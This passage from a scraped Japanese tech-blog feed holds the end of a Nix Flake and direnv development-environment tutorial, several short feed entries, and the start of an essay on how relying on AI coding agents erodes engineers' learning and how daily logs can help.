inputs.nixhelm.chartsDerivations.nginx;      values = { replicaCount = 3; service.type = \\"LoadBalancer\\"; };    };  };}nixidy.dev近年、ソフトウェアサプライチェーンのセキュリティが重視されている。ビルドの再現性と依存関係の透明性は「必須」になりつつある。Nix はビルドプロセス全体を宣言的に記述するため、SBOM の自動生成と来歴の追跡が容易だ。thenewstack.io実践：複数言語での開発環境構築flake-parts によるモジュール化複雑な Flake を管理しやすくするために、flake-parts を使う。これは NixOS モジュールシステムの考え方を Flake に適用したもので、設定を複数ファイルに分割できる。{  inputs = {    nixpkgs.url = \\"github:nixos/nixpkgs?ref=nixpkgs-unstable\\";    flake-parts.url = \\"github:hercules-ci/flake-parts\\";    treefmt-nix.url = \\"github:numtide/treefmt-nix\\";  };  outputs = { flake-parts, ... }@inputs:    flake-parts.lib.mkFlake { inherit inputs; } {      imports = [ inputs.treefmt-nix.flakeModule ];      systems = [ \\"aarch64-darwin\\" \\"aarch64-linux\\" \\"x86_64-linux\\" ];      perSystem = { config, pkgs, ... }: {        devShells.default = pkgs.mkShell {          packages = with pkgs; [            nodejs_22            config.treefmt.build.wrapper          ];        };        treefmt = {          projectRootFile = \\"flake.nix\\";          programs.prettier.enable = true;          programs.nixfmt.enable = true;        };      };    };}flake.partsRust 開発環境Rust プロジェクトでは、rust-overlay を使う。rustupなしで stable/nightly を切り替えられる。rust-analyzer や clippy も flake.nix で宣言的に管理できる。{  inputs.rust-overlay.url = \\"github:oxalica/rust-overlay\\";  perSystem = { pkgs, system, ... }:    let      overlayPkgs = import inputs.nixpkgs {        inherit system;        overlays = [ inputs.rust-overlay.overlays.default ];      };      rustToolchain = overlayPkgs.rust-bin.stable.latest.default.override {        extensions = [ \\"rust-src\\" \\"rust-analyzer\\" \\"clippy\\" ];      };    in {      devShells.default = pkgs.mkShell {        packages = [          rustToolchain          pkgs.cargo-watch          pkgs.cargo-edit        ];      };    };}github.comGo 開発環境{  devShells.default = pkgs.mkShell {    packages = with pkgs; [      go      golangci-lint      gopls      delve    ];    env = {      CGO_ENABLED = \\"0\\";    };  };}Python 開発環境Python では uv との組み合わせを推奨する。Nix で Python 本体と uv を提供し、パッケージ管理は uv に任せる。pyenv/venv/pip の組み合わせより高速で、依存解決も確実だ。{  devShells.default = pkgs.mkShell {    packages = with pkgs; [      python312      uv      ruff      pyright    ];    env = {      UV_PROJECT_ENVIRONMENT = \\".venv\\";    };  };}マルチ言語プロジェクト1つの Flake で複数の開発環境を提供できる。{  devShells = {    default = pkgs.mkShell {      packages = [ rustToolchain pkgs.go pkgs.nodejs_22 ];    };    rust = pkgs.mkShell { packages = [ rustToolchain ]; };    go = pkgs.mkShell { packages = [ pkgs.go ]; };    nodejs = pkgs.mkShell { packages = [ pkgs.nodejs_22 ]; };  };}使用時は以下のように選択できる。nix develop        # デフォルト（全言語）nix develop .#rust # Rust のみnix develop .#go   # Go のみ様々な言語向けのテンプレートが dev-templates リポジトリで公開されている。github.comdirenv との連携direnv とはdirenv は、ディレクトリごとに環境変数を自動で切り替えるツールだ。.envrc ファイルを配置したディレクトリに入ると自動的に環境がロードされ、離れるとアンロードされる。direnv.netnix-direnv のセットアップNix Flake と direnv を連携させるには、nix-direnv が必要だ。実際にセットアップした手順を紹介する。1. nix-direnv のインストール# Nix profile でインストールnix profile install nixpkgs#nix-direnv# インストール確認ls ~/.nix-profile/share/nix-direnv/# direnvrc が存在することを確認2. direnvrc の設定~/.config/direnv/direnvrc に以下を追加する。# nix-direnv を使用して Nix Flake 環境を高速にロード# キャッシュにより、シェル起動時の遅延を大幅に削減if [ -f \\"$HOME/.nix-profile/share/nix-direnv/direnvrc\\" ]; then  source \\"$HOME/.nix-profile/share/nix-direnv/direnvrc\\"elif [ -f \\"/nix/var/nix/profiles/default/share/nix-direnv/direnvrc\\" ]; then  source \\"/nix/var/nix/profiles/default/share/nix-direnv/direnvrc\\"elif [ -f \\"/run/current-system/sw/share/nix-direnv/direnvrc\\" ]; then  source \\"/run/current-system/sw/share/nix-direnv/direnvrc\\"fi3. シェルへの hook 追加使用しているシェルに応じて設定を追加する。# bash (~/.bashrc)eval \\"$(direnv hook bash)\\"# zsh (~/.zshrc)eval \\"$(direnv hook zsh)\\"# fish (~/.config/fish/config.fish)direnv hook fish | sourcegithub.comプロジェクトでの使用1. .envrc ファイルの作成プロジェクトルートに .envrc を作成する。# .envrc - 基本的な使い方use flakeより詳細な設定も可能だ。# .envrc - 詳細な設定例# nix-direnv を使用（高速・キャッシュ対応）use flake# 特定の devShell を使用する場合# use flake .#rust# 追加の環境変数export EDITOR=\\"nvim\\"export MY_PROJECT_ENV=\\"development\\"2. direnv の許可セキュリティのため、初回は明示的に許可が必要だ。cd my-projectdirenv allow動作確認実際に動作を確認した結果を示す。# direnv のステータス確認$ direnv statusdirenv exec path /opt/homebrew/bin/direnvDIRENV_CONFIG /Users/nwiizo/.config/direnvFound RC path /path/to/project/.envrcFound RC allowed 0Found RC allowPath /Users/nwiizo/.local/share/direnv/allow/...nix-direnv のキャッシュ機構nix-direnv は .direnv/ ディレクトリにキャッシュを作成する。実際のキャッシュ構造は以下のようになる。.direnv/├── bin/                    # 一時的なバイナリラッパー├── flake-inputs/           # 入力 Flake のキャッシュ├── flake-profile-*         # Nix Store へのシンボリックリンク└── flake-profile-*.rc      # 環境変数のキャッシュ（約86KB）キャッシュの効果flake-profile-* は Nix Store の実際のパッケージを指す例: /nix/store/l5rhpr6i98h3kvydy6gww5cvszmqi05a-nix-shell-env2回目以降のロードは数ミリ秒で完了nix-collect-garbage でもキャッシュは保護されるnix-direnv vs 標準 direnv 観点  nix-direnv  標準 direnv + use nix  初回ロード  同等（ビルドが必要）  同等  2回目以降  数ミリ秒  数秒〜数十秒  GC 耐性  保護される  削除される可能性  Flake 対応  ネイティブ  追加設定が必要  キャッシュサイズ  〜100KB/プロジェクト  なし マルチ言語プロジェクトでの設定複数の devShell を持つプロジェクトでは、以下のように使い分けられる。# .envrc# デフォルトで全言語環境をロードuse flake# または特定の言語環境のみロードする場合:# use flake .#rust# use flake .#go# use flake .#python# use flake .#nodejsトラブルシューティングdirenv が反応しない# シェルフックが設定されているか確認which direnvdirenv status# 許可されているか確認direnv allow環境がロードされない# .envrc の構文エラーをチェックdirenv edit# キャッシュをクリアして再構築rm -rf .direnvdirenv allowFlake が見つからない# flake.nix が Git に追加されているか確認git status flake.nixgit add flake.nix flake.lockDeterminate Systems のブログでは、direnv と Nix の連携について詳しく解説されている。determinate.systemsCI/CD との統合GitHub Actions での使用name: CI with Nix Flakeon: [push, pull_request]jobs:  build:    runs-on: ubuntu-latest    steps:      - uses: actions/checkout@v4      # Nix インストール（Determinate Systems 推奨）      - uses: DeterminateSystems/nix-installer-action@main      # Magic Nix Cache でビルドを高速化      - uses: DeterminateSystems/magic-nix-cache-action@main      # Flake のチェック      - run: nix flake check      # フォーマットチェック      - run: nix develop --command treefmt --ci      # ビルド      - run: nix buildgithub.comCachix によるバイナリキャッシュCI でビルドした成果物を Cachix にプッシュすると、他の開発者やCI環境ではビルド済みバイナリをダウンロードするだけで済む。ビルド時間が大幅に短縮される。- uses: cachix/cachix-action@v15  with:    name: your-cache    authToken: \'${{ secrets.CACHIX_AUTH_TOKEN }}\'overlay によるカスタマイズパッケージのカスタマイズoverlay を使うと、既存のパッケージをカスタマイズしたり、独自のパッケージを追加したりできる。{  customOverlay = final: prev: {    # 既存パッケージをラップ    myGit = prev.writeShellScriptBin \\"git\\" \'\'      exec ${prev.git}/bin/git -c init.defaultBranch=main \\"$@\\"    \'\';    # カスタムスクリプト    project-init = prev.writeShellScriptBin \\"project-init\\" \'\'      echo \\"Initializing project...\\"      ${prev.git}/bin/git init      echo \\"# New Project\\" > README.md    \'\';  };}treefmt による統一フォーマット複数言語のフォーマッターを1つのコマンドで実行できる。{  treefmt = {    projectRootFile = \\"flake.nix\\";    programs = {      nixfmt.enable = true;      rustfmt.enable = true;      gofmt.enable = true;      prettier.enable = true;      ruff-format.enable = true;    };  };}treefmt      # 全ファイルをフォーマットtreefmt --ci # CI でのチェック（変更があればエラー）github.comトラブルシューティングexperimental-features エラーerror: experimental Nix feature \'nix-command\' is disabled~/.config/nix/nix.conf に以下を追加する。experimental-features = nix-command flakesnix develop が遅い初回は依存関係のダウンロードとビルドに時間がかかる。2回目以降はキャッシュが効くため高速だ。Cachix を使うとより高速化できる。direnv が無限ループするFish shell を使っている場合、shellHook で exec fish を呼ばないように注意する。Flake が見つからないFlake ファイルは Git に追加されている必要がある。未追跡ファイルは Nix から見えない。git add flake.nix flake.lockまとめNix Flake を導入することで、開発環境の「再現性」「分離性」「共有性」を根本から改善できる。Docker とは競合ではなく補完関係にあり、両者を組み合わせることで「再現可能なビルド」と「ポータブルなデプロイ」を両立できる。導入の主なメリットをまとめる。開発環境のセットアップが nix develop の1コマンドにチーム全員が同じツールバージョンを使用CI と開発環境の乖離がなくなるフォーマットの一貫性を自動で保証Docker イメージのビルドも再現可能に学習コストは確かに高い。Nix言語の習得やStore/Derivationの概念理解には時間がかかる。しかし一度導入すれば、環境構築が1コマンドで完了する。「環境差異によるバグ」が原理的になくなり、CIと開発環境が同一になる。特に複数言語プロジェクトでは、rustup/pyenv/nvm/goenvの個別管理から解放され、単一のflake.nixで全ての言語ツールチェーンを統一できる。まずは小規模なサイドプロジェクトで試してみてほしい。nix flake init -t github:the-nix-way/dev-templates#rust ですぐに始められる。このブログが良ければ読者になったり、nwiizoのXやGithubをフォローしてくれると嬉しいです。","isoDate":"2025-12-18T02:15:00.000Z","dateMiliSeconds":1766024100000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"Interested in Self-Endless Advent Calendar?","link":"https://daisuke1024akagawa.medium.com/interested-in-a-self-endless-advent-calendar-afc8ca9bf4b0?source=rss-c54ac439ad2b------2","contentSnippet":"I’ve been writing tech blog on Japanese tech blog media, Zenn, since April 18, 2025 everyday. I’ll share why I started this activity and…Continue reading on Medium \xbb","isoDate":"2025-12-17T13:29:58.000Z","dateMiliSeconds":1765978198000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"GitHubで管理しているZennのファイル名を一括修正した話","link":"https://daisuke1024akagawa.medium.com/github%E3%81%A7%E7%AE%A1%E7%90%86%E3%81%97%E3%81%A6%E3%81%84%E3%82%8Bzenn%E3%81%AE%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E5%90%8D%E3%82%92%E4%B8%80%E6%8B%AC%E4%BF%AE%E6%AD%A3%E3%81%97%E3%81%9F%E8%A9%B1-2020c94f2e60?source=rss-c54ac439ad2b------2","isoDate":"2025-12-17T13:04:22.000Z","dateMiliSeconds":1765976662000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Aimシリーズ：OptunaとPytorch Lightningを組み合わせたMNIST実験管理","link":"https://zenn.dev/akasan/articles/aim_optuna_lightning_mnist","contentSnippet":"今回はAimで実験管理を行いつつ、OptunaとPytorch Lightningを使ってMNISTの分類をしてみました。ぜひ過去の以下の記事を参考にしてください。https://zenn.dev/akasan/articles/6221f74bea622dhttps://zenn.dev/akasan/articles/a75361d039906f 早速実装 環境構築uvを使って以下で環境を構築します。uv init aim_optuna_lightning_mnist -p 3.12cd aim_optuna_lightning_mnistuv add aim l...","isoDate":"2025-12-17T11:15:24.000Z","dateMiliSeconds":1765970124000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"Aimシリーズ：入門してみた","link":"https://zenn.dev/akasan/articles/aim_ml_tracking_intro","contentSnippet":"今回から、Aimという実験管理ツールに入門してみます。※ 出張中につき、短編になります。 Aimとは？Aimとはオープンソースの実験管理ツールになります。Aimを利用すると実験を実行し、その結果発生する様々なメタデータを一元的に取り扱い、グラフィカルに解析することができます。Aimを利用することで以下のようなことが実現できます。MLパイプラインのロギングを可能にするUIを通してメタデータを比較分析できるML学習を効率的に実行可能実験管理のオーガナイズができるhttps://github.com/aimhubio/aim/ 早速使ってみる今回はGitHub上で提...","isoDate":"2025-12-17T11:15:23.000Z","dateMiliSeconds":1765970123000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"agnoを使ってOpenAIのエージェントを作成してみた","link":"https://zenn.dev/akasan/articles/agno_openai_agent_intro","contentSnippet":"今回はagnoのOpenAI連携機能を利用してエージェントを作ってみました。 agnoとは？agnoとはメモリや知識、ツールやリーズニングを実現するエージェントを実装するための軽量なフレームワークとなります。agnoを利用することで、推論エージェントやマルチモーダルエージェント、エージェントワークフローを構築できます。agnoはエージェントとチャットするための美しいUIやエージェントにサービスを提供する構築済みのFastAPIルート、そしてエージェントのパフォーマンスを監視・評価するためのツールも提供するとのことです。https://github.com/Akasan/agno...","isoDate":"2025-12-17T11:15:23.000Z","dateMiliSeconds":1765970123000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"agnoのGuardrail機能を試してみた","link":"https://zenn.dev/akasan/articles/agno_guardrail_feature","contentSnippet":"今回は昨日に引き続きagnoを利用してみました。agnoではGuardrailの機能について提供しており、そのサンプルを通して挙動を確認してみようと思います。昨日のagnoの導入記事もぜひ合わせてご覧ください。https://zenn.dev/akasan/articles/80953b8e206dd0 早速使ってみる今回は以下のページを参考にサンプルを試してみます。https://docs.agno.com/concepts/agents/guardrails/overviewhttps://docs.agno.com/examples/concepts/agent/gua...","isoDate":"2025-12-17T11:15:22.000Z","dateMiliSeconds":1765970122000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"GitHubで管理しているZennのファイル名を一括修正した話","link":"https://zenn.dev/akasan/articles/claude_code_zenn_title","contentSnippet":"私は普段Zennの投稿をGitHubで管理しているのですが、記事のファイル名を一括で更新したので、その内容を共有しようと思います。 どうやってZennの記事をGitHubで管理しているかZenn公式が出している以下の記事に載っている方法で管理しています。https://zenn.dev/zenn/articles/connect-to-githubまた、記事を作成するときはZennのCLIを利用しています。ZennのCLIについてはこちらを見ていただければ使い方がわかると思いいただければ使い方がわかると思います。私は入力を省略するため、以下のようなzenn_articleという...","isoDate":"2025-12-17T11:00:00.000Z","dateMiliSeconds":1765969200000,"authorName":"Daisuke Akagawa","authorId":"akagawa"},{"title":"2025年版 私がAIエージェントと協働しながら学習する方法","link":"https://syu-m-5151.hatenablog.com/entry/2025/12/17/121705","contentSnippet":"労働こそが最高の学習だったあなたは最近、「成長している」と感じているだろうか。かつて、プログラマーにとって、労働こそが最高の学習の場だった。なぜか。労働には「摩擦」があったからだ。エラーが出る。原因がわからない。仮説を立てる。試す。失敗する。また試す。この摩擦の中で、経験が意味に変わっていた。労働は、経験を意味に変換する装置だった。以前の開発を思い出す。新しいフレームワークを覚えなければならない。エラーと格闘して、ドキュメントを読み漁って、やっと動いたとき。あの達成感は、単なる満足ではなかった。「なぜ動かなかったか」「どう直したか」「次に同じ問題が起きたらどうするか」——この因果の記憶が、脳に刻み込まれていた。困難を乗り越えた記録が、自分の中に残っていた。Claude Codeで開発している今、コードは書ける。動く。レビューも通る。Claude CodeはAnthropicが提供するAIエージェント型の開発ツールで、ターミナル上で動作し、コードの生成・編集・実行・デバッグまでを自然言語で指示できる。従来の「コード補完」とは次元が違う。プロジェクト全体を理解し、ファイルを横断して作業し、テストまで書いてくれる。開発のあり方が、根本から変わった。しかし、その便利さの裏で、何かがおかしくなっていた。コードは書ける。動く。レビューも通る。でも、後から「なぜそう書いたの？」と聞かれても、答えに淀む。自分が責任を持って出力したコードのはずなのに、説明しようとすると言葉が出てこない。因果を辿れない。「なぜこの実装なのか」「他の選択肢は何だったか」「どこで判断したか」——この記憶がない。このままでは「実装ガチャ」を回し続けるだけの存在になってしまう。先日、それを痛感する出来事があった。本番環境で障害が起きた。自分が2週間前に実装した機能だ。ログを見る。エラーメッセージを読む。でも、原因の見当がつかない。「この処理、どういう順序で動くんだっけ」と考える。思い出せない。自分で書いたコードなのに、頭の中でトレースできない。因果がわからない。結局、AIにコードを貼り付けて「このエラーの原因は？」と聞いた。答えは返ってきた。直った。しかし、自分では何も解決していない。2週間前の自分が書いたコードを、今日の自分が理解できていなかった。もしかして、あなたも同じ感覚を持っていないだろうか。最初は自分を責めた。集中力が落ちたのか。学習能力が衰えたのか。でも違った。労働と学習が、分離した。摩擦が消えた。経験が意味に変わる機会が消えた。厄介だったのは、見せかけ上の生産性は上がっていたことだ。タスクは消化されている。アウトプットも出ている。しかし、3ヶ月前にやった案件の技術スタックを聞かれても、ほとんど思い出せない。生産性は上がった。成長は止まった。労働から学習が抜け落ちていた。「成長していない」と感じるとき、私たちは何を失っているのか。成果と経験と理解は、同じものだろうか。違う。成果は外に出たもの。経験は時間の中で起きたこと。理解は内側に残ったもの。成果が出ても、経験を積んでも、理解が残らなければ成長は感じられない。失われているのは「苦労」ではない。「プロセスの記憶」だ。自分が何を考え、どこで躓き、どう乗り越えたか。この記憶が消えている。AIが生成したコードは動く。でも、そこに至るまでに自分が何を試し、何を捨て、何を選んだか——その記憶がない。なぜ過去の仕事を説明できないと不安になるのか。説明できないということは、プロセスの記憶がないということだ。記憶がないということは、自分の中で何も変化が起きていないということだ。成長実感とは、能力の増加ではない。自分の内部で変化が起きたと確認できる手応えだ。では、記憶に残らない仕事は価値がないのか。そうではない。成果としての価値はある。でも、自分を成長させる価値はない。成果は外に残る。成長は内に残る。両者は別物だ。これは集中力の問題ではなかった。前回の記事「2025年版 私がAIエージェントと協働しながら集中する方法」で書いた微観法は、集中の持ち方を変えてくれた。でも、学習の問題は別だった。集中できても、学べていなかったのだ。syu-m-5151.hatenablog.com『信長の野望』をやっているのに『戦国無双』のような強さを求めるのは違う、と言われるかもしれない。地道な内政と、爽快なアクション。求めているものが違う。でも正直なところ、私たちはいつだってエンジニアなのでエンジニア領域で無双したいのです。AI時代の3つの非対称性ここまで、私個人の経験として「労働と学習の分離」を語ってきた。でも、ここまで読んで、「これは自分だけの問題かもしれない。単に自分の学び方が下手なだけでは？」と思った人もいるだろう。そうではない。これは個人の問題ではない。構造の問題だ。なぜ労働と学習が分離してしまったのか。その構造を理解するには、AIがもたらした3つの非対称性を見る必要がある。詳しくは別の記事で書いたが、ここでも簡単に触れておきたい。syu-m-5151.hatenablog.com第一の非対称性：生産と理解の乖離。AIでコードを書く速度は上がった。でも、そのコードを修正しようとすると、予想以上に時間がかかる。システム内にコードが流入する速度と、人間がそれを理解する速度の間に、決定的なギャップが生まれている。第二の非対称性：生産量と成長の乖離。AIを使えば、経験1年目でも大量のコードを生産できる。PRの数も増える。でも半年後、1年後、エンジニアとしての地力はどうなっているだろうか。問題を自分で分析し、設計を考え、トレードオフを検討するプロセス。これがエンジニアの地力を育てる。AIに頼りすぎると、この思考プロセスそのものを外部化してしまう。第三の非対称性：経験の量と学びの質の乖離。毎日AIを使って100行のコードを書く経験を1年積んでも、そこから「AIへの依存」しか学ばなければ、地力にはつながらない。「何を経験したか」ではなく、「そこから何を学んだか」が重要なのだ。この3つの非対称性は、1つのシステムとして機能している。速く書けることを追求すれば、理解が追いつかなくなる。理解しないまま大量に生産すれば、思考力が育たない。経験を積んでも、そこから学ばなければ、成長は起きない。根底にあるメンタルモデル—「速さが価値」「量が成果」「経験が成長」—を変えない限り、どんな対症療法も一時的な効果しか生まない。ここまでで、外部から見た構造——AIと人間の関係性——は理解できた。しかし、これだけでは「なぜ学べないのか」の本当の理由は見えてこない。構造は外側の話だ。学習が起きるのは、私たちの脳の内側だ。では、この構造が私たちの脳に何をしているのか。もう少し掘り下げてみよう。脳が「処理」していない構造の問題は、最終的に脳の問題に帰着する。なぜ知識が残らないのか。しばらく自分を観察してみた。気づいたのは、AIエージェントと働いていると、認知的負荷が下がりすぎるということだ。認知的負荷とは、頭を使う度合いのことだ。問題を解くとき、脳は情報を処理し、比較し、判断する。この「頭を使う」プロセスが、認知的負荷を生む。負荷が下がること自体は、一見良いことに思える。楽に仕事ができる。疲れにくい。でも、学習の観点からは最悪だった。脳は適度な負荷がかからないと、情報を長期記憶に格納しない。「苦労せずに得た情報」は、脳にとって重要度が低いと判断される。楽に得た知識は、楽に消える。では、認知的負荷はどこからが「害」になるのか。問題は量ではない。質だ。認知的負荷には種類がある。タイピングの負荷。構文を思い出す負荷。そして、比較・判断・仮説といった意味処理の負荷。AIが減らしてくれるのは、すべての負荷だ。だが、害になるのは意味処理の負荷が消えたときだ。なぜ脳は負荷がないと学ばないのか。脳は「重要でない」と判断した情報を捨てる。重要かどうかの判断基準は、処理にかかった負荷だ。苦労して得た情報は重要。楽に得た情報は重要でない。意味処理の負荷が消えた瞬間、脳は「これは覚えなくていい」と判断する。記憶も学習も、起こらなくなる。「ちょうどよい負荷」は誰が決めるのか。AIではない。あなただ。負荷をAIに外注すると、脳は怠ける。怠けた脳は弱くなる。認知的負荷は削減対象ではない。設計対象だ。どの負荷を残し、どの負荷を外注するか。その設計を自分でしなければ、学習は起こらない。楽になることと、考えなくなることは同じか。違う。作業が楽になるのはいい。思考が楽になるのは危険だ。手を動かす負荷は減らしていい。意味を処理する負荷は、意図的に残せ。以前のプログラミングを思い出す。エラーが出る。ググる。ブログや公式ドキュメントを読む。試す。またエラー。別の方法を試す。やっと動く。このプロセス全体が、学習だった。途中で「わからない」状態に耐える必要があった。その「耐える時間」が、脳を鍛えていた。記憶を定着させていた。今はどうか。エラーが出る。AIに投げる。答えが返ってくる。動く。終わり。プロセスが消えた。プロセスが死ぬと、学習も死ぬ。考えてみてほしい。あなたが最後に「わからない」と感じたのは、いつだろうか。私は本当に思い出せなかった。AI時代において、「わからない」が絶滅したのだ。聞けば答えが返ってくる。どんな質問にも、それらしい回答が生成される。以前は「わからない」状態で立ち止まり、悩み、調べ、試行錯誤した。その時間が学習だった。今は「わからない」と感じる前に、答えが手に入る。「わからない状態」に耐える力こそ、学習に不可欠だ。わからない状態は不快だ。不確実性は脳にストレスを与える。だから、答えを求める。AIはその欲求を即座に満たしてくれる。だが、「わからない」は単なる欠如ではない。意味を構築するための空白だ。以前の学習を思い出してほしい。エラーが出て、原因がわからない。ドキュメントを読んでも、ピンとこない。仮説を立てて、試して、また失敗する。その空白の中で、脳は問題を構造化していた。何がわかっていて、何がわかっていないか。どこまでは正しくて、どこからが怪しいか。仮説を立て、壊し、更新する。このプロセスを通じて、人は「思考の型」と「判断の軸」を獲得してきた。わからない経験がなくなると、思考の型が育たない。問題をどう分解するか。仮説をどう立てるか。どの順番で検証するか。これは、わからない状態を何度も経験することでしか身につかない。答えが即座に与えられる世界では、この「思考の筋トレ」そのものが消える。AIはわからないと言わない。常に何かを返す。それが正しいかどうかは別として。人間だけが「わからない」を経験できる。その経験を捨てるのは、思考力を捨てることだ。でも、その「すぐわかる」が、実は思考力を奪っていた。自分一人で「じっくり」考える時間が消えた。わからないまま考え続ける能力。不確実性の中にとどまる能力。それが失われていく。「わからない」を経験しないまま、「わかった」に到達してしまう。ここまでは「わからない状態」の話だった。つまり、問題に直面したとき、AIがすぐに答えを出してしまうから、自分で考える時間がなくなるという話だ。でも、認知的負荷が下がる問題は、これだけではない。AIの答えを受け取って「わかった」と思った後にも、別の問題がある。コードへの解像度が下がるのだ。以前、自分で書いたコードは、補完もありながらちゃんと打ち込んでいた。変数名を決めるときに悩んだ。ループの終了条件を頭の中でシミュレートした。このif文の分岐は、こういうケースでtrueになる。この変数には、この時点でこの値が入っている。コードは指先から脳へ流れ込んでいた。AIが生成したコードは、目で見ているだけだ。なんとなく動く気がするから動かす。動く。テストも通る。でも、変数の1つに至るまで把握しているかと言われると、怪しい。コードが「通過」していく感覚。身体に染み込んでいない。見ているのに、触れていない。この違和感の正体は何か。自分で書いたコードと、AIが書いたコードは何が違うのか。結果は同じだろう。動作も同じだろう。でも、因果関係を自分で通ったかどうかが違う。自分で書いたコードには、因果の記憶がある。「この変数名、最初はdataにしようと思った。でも、後から読んだときに意味がわからなくなると思って、userResponseに変えた」。「このループ、最初はforで書いた。でも、副作用がないからmapの方がきれいだと思って書き直した」。迷い、選択し、決断した記憶。その因果を自分で通った記憶が、コードを「理解している」という感覚を生む。AIが生成したコードには、この因果がない。結果だけがある。「なぜこの変数名なのか」「なぜこの書き方なのか」。AIには理由があるのだろう。でも、その理由を自分で通っていない。書く・迷う・選ぶという行為を経ていないコードは、頭の中で「実行」されていない。なぜ説明できないと不安になるのか。説明できないということは、因果を再構成できないということだ。因果がわからないコードは、壊れたとき直せない。変更したとき、何が起きるか予測できない。「動くこと」と「わかること」は別だ。動くことは確認できる。わかることは、因果を辿れるかどうかで決まる。理解とは知識量ではない。因果を身体でトレースできるかどうかだ。「見ているが触っていない」とは、この状態だ。視覚的には認識している。でも、因果を身体で通過していない。だから、記憶に残らない。応用が利かない。自分のものにならない。解像度が低い理解は、何を引き起こすのか。判断ができなくなる。「この実装でいいのか」「この変更は安全か」。判断には、因果の理解が必要だ。因果がわからなければ、判断できない。判断できない人間は、AIの出力を受け入れるしかない。私は自分で書いたコードは、書く過程で何度も頭の中で実行している。「この変数がnullだったらどうなる」「このループは何回まわる」「この関数の戻り値は何型か」。無意識に検証している。AIが生成したコードには、この検証プロセスがない。結果、コードの「解像度」が違う。自分で書いたコードは、ズームインしてもくっきり見える。AIが生成したコードは、全体像はわかるが、細部がぼやけている。動くことは知っている。なぜ動くかは、よくわからない。解像度が低いと、記憶にも残りにくい。ぼんやりした情報は、脳に定着しない。そしてもう1つ、記憶を弱くする要因がある。解像度の問題とは別に、「思い出す」作業をしていないのだ。記憶を定着させるには、能動的に思い出す作業が必要だ。一度覚えたことを、何も見ずに思い出す。その「引き出す」作業が、記憶を強化する。でもAIと働いていると、思い出す必要がない。わからないときは聞けばいい。脳が「引き出す」練習をしなくなった。筋トレと同じだ。重いものを持ち上げないと筋肉はつかない。代わりに機械が持ち上げてくれたら、楽だけど、筋肉は衰える。AIは脳の代行業者だ。頼りすぎると、依頼主が衰える。何をしたか覚えていない、だから自分を過小評価するここまで、認知的負荷が下がることで起きる3つの問題を見てきた。「わからない」状態を経験しなくなること。コードへの解像度が下がること。そして、「思い出す」作業をしなくなること。これらは脳の内側で起きている問題だった。しかし、認知的負荷が下がることには、もう1つ厄介な副作用がある。脳の外側、つまり自分自身の認識に関わる問題だ。自分が何をしたのか覚えていないのだ。1日の終わりに「今日、何やったっけ？」と振り返る。AIと働いていると、驚くほど思い出せない。タスクは消化した。PRはマージされた。でも、何をどう解決したのか、記憶がぼんやりしている。なぜか。苦労しなかったからだ。痛みを伴わない経験は、砂に書いた文字だ。苦労は記憶のアンカーになる。あのエラーで3時間ハマった。あの設計で悩んで何度も書き直した。そういう「苦労の記憶」が、「自分がやった」という実感を生む。AIが苦労を肩代わりすると、このアンカーがなくなる。アンカーがないと、何が起きるか。自分を過小評価するようになる。「今日、大したことやってないな」と感じる。でも実際には、かなりの量のコードがマージされている。客観的には生産性が上がっているのに、主観的には「何もやっていない」気がする。成果と実感が乖離する。これは私だけの感覚ではない。知り合いのエンジニアと話していても、同じことを言う人が多い。「なんか最近、成長している実感がない」「仕事はこなせているけど、自分が何をやったか説明できない」。みんな同じ違和感を抱えている。感覚と現実が、乖離しているのだ。なぜ「何をしたか」を覚えていないと不安になるのか。自己評価はどこから生まれているのか。自己評価は、成果から生まれるのではない。「自分が困難にどう向き合ったか」という記憶から生まれる。あのバグを3時間かけて潰した。あの設計を何度も書き直した。あの障害対応で深夜まで粘った。こうした記憶が、「自分はやれる」という感覚を作る。苦労は自己評価の原材料だ。AIが苦労を肩代わりすると、何が起きるか。成果はある。でも、「自分がやった」という実感が残らない。困難と向き合った記憶がないから、自分を評価する材料がない。結果、成果が出ているのに自分を信じられなくなる。成果と達成感はなぜズレるのか。達成感は「困難を乗り越えた」という認識から生まれる。困難がなければ、達成感も生まれない。AIが困難を消してくれると、成果だけが残り、達成感は消える。成果と達成感の乖離。これがAI時代の新しい病だ。このズレは長期的に何を壊すのか。まず、挑戦を避けるようになる。「どうせAIがやってくれる」と思う。自分で考えることを放棄する。次に、自分を信じられなくなる。難しい問題に直面したとき、「自分にはできない」と感じる。かつて乗り越えた経験がないから、乗り越えられるイメージが湧かない。そして最後に、エンジニアとしてのアイデンティティが揺らぐ。「自分は何ができる人間なのか」がわからなくなる。成果は出ている。でも、それは自分の力なのか、AIの力なのか。区別がつかなくなる。達成の記憶がないなら、何かで補うしかない。では、何で補うのか。答えを先に言う。記録だ。達成の記憶がないなら、記録で作ればいい。苦労の記憶がないなら、躓きを記録で残せばいい。AIが消してしまう「プロセスの記憶」を、意図的に書き留める。それが私の出した答えだった。日報が労働と学習をつなぎ直したここまで読んで、「わかる、でもどうすればいいの？」と思っただろうか。私も同じだった。記録が大事だとわかっても、何をどう記録すればいいかわからなかった。行き詰まっていたとき、藁にもすがる思いで、ある習慣を始めた。日報だ。正直、日報は嫌いだった。面倒くさい。忙しい。後で書こうと思って忘れる。3日分まとめて書いて、何をやったか思い出せない。典型的なサボりパターンだった。何度も挫折した。でも、このままでは本当にまずいと思った。自分が書いたコードを説明できない。障害が起きても自分で解決できない。エンジニアとして、このまま衰えていくのか。その恐怖が、嫌いな日報を続けさせた。でも、日報の目的を変えてみた。上司への報告のためではなく、労働の中で生まれた曖昧さを捕まえるために書く。自分が何をわかっていて、何をわかっていないか。その現状を記録する仕組みだ。日報を続けて、衝撃的な事実に気づいた。その話は後で詳しく書く。でもその前に、一度立ち止まって考えたい。日報を書いて躓きを記録する。それは「学習」につながるはずだ。しかし、そもそも「学習する」とは何なのだろうか。この根本的な問いを考えないと、日報を書く意味も見えてこない。では、「学習する」とは、そもそも何なのでしょうか。この問いを考えるとき、私は為末大さんの『熟達論——人はいつまでも学び、成長できる』（新潮社、2023年）に大きな影響を受けました。400mハードルで日本記録を持つ「走る哲学者」が、様々な分野の達人たちとの対話を重ねて到達した方法論です。www.shinchosha.co.jp為末さんは、人が何かを学び